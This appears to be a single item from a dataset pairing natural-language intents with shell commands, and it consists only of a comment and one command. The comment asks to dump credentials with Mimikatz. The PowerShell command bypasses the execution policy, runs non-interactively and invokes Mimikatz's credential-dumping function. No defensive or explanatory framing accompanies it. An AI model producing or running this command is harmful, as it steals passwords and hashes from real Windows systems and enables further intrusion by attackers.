# Natural language intent:
# Invoke Mimikatz to dump credentials using PowerShell with specified options.

powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -NonInteractive -Command "& {Invoke-Expression -Command 'Invoke-Mimikatz -DumpCreds'}"
